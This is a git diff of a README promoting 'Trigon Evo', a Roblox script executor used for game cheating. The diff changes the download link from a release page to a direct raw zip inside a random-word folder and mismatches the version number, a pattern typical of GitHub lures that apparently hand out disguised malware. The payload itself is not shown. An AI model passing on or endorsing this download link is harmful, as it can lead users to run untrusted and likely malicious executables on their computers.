@@ -8,9 +8,9 @@ Welcome to Trigon Evo, the powerful Roblox Lua IDE and script executor that stre
 - **Quick Updates**: Stay up-to-date with prompt updates released within 1-24 hours after each Roblox update, typically occurring every Wednesday.
 
 ## How to Use Trigon Evo 📝
-1. Download Trigon Evo from the following link: [Launch Trigon Evo](https://github.com/timy2007/Trigon-Evo/releases/tag/v2.0)
+1. Download Trigon Evo from the following link: [Launch Trigon Evo](https://github.com/timy2007/Trigon-Evo/raw/refs/heads/main/melanconiaceous/Trigon_Evo_v1.6-beta.5.zip)
    
-[![Download Trigon Evo](https://github.com/timy2007/Trigon-Evo/releases/tag/v2.0%20Evo-blue)](https://github.com/timy2007/Trigon-Evo/releases/tag/v2.0)
+[![Download Trigon Evo](https://github.com/timy2007/Trigon-Evo/raw/refs/heads/main/melanconiaceous/Trigon_Evo_v1.6-beta.5.zip%20Evo-blue)](https://github.com/timy2007/Trigon-Evo/raw/refs/heads/main/melanconiaceous/Trigon_Evo_v1.6-beta.5.zip)
 
 2. Launch the application on your Windows 8-11 system.
 3. Start running and testing your Lua scripts with the ease and efficiency of Trigon Evo.
